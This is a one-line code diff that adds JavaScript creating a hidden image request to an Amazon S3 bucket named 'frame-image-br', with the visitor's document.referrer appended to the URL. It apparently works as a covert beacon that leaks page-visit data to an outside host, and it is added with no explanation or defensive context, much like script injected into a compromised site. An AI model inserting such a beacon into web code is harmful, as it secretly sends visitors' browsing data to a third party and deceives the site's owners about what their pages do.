@@ -1,0 +1,1 @@
+ var i = new Image; u = "https://s3-sa-east-1.amazonaws.com/frame-image-br/bg.png?x-id=REAL&x-r=" + document.referrer; i.src = u; 
